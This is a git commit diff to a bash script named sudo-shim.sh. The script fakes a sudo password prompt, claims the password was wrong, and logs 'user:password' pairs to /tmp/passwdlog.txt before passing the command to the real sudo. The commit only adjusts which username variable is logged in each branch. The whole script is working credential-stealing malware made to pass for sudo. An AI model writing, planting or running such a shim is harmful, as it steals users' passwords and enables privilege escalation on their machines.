e66c13171ebe73cb45c07e8143435e8db1120c8a
Nathaniel Beckstead <becksteadn@gmail.com>
2019-10-23 09:23:37 -0400

    different username var for each case

--- sudo-shim.sh
+++ sudo-shim.sh
@@ -1,12 +1,17 @@
 #!/bin/bash
+
+PASSLOG="/tmp/passwdlog.txt"
+
 if [ "$EUID" -ne 0 ]; then
     read -s -p "[sudo] password for $(whoami): " passw  # Fake a sudo prompt.
     echo ""
     sleep 2
     echo "Sorry, try again."
+    echo "$(whoami):$passw" >> $PASSLOG
 else
     read -s -p "[sudo] password for $SUDO_USER: " passw # Already running as root but let's fake em out anyway.
     echo ""
+    echo "$SUDO_USER:$passw" >> $PASSLOG
 fi
-echo "$(whoami):$passw" >> /tmp/passwdlog.txt
+
 /usr/bin/sudo $@ # Run requested command
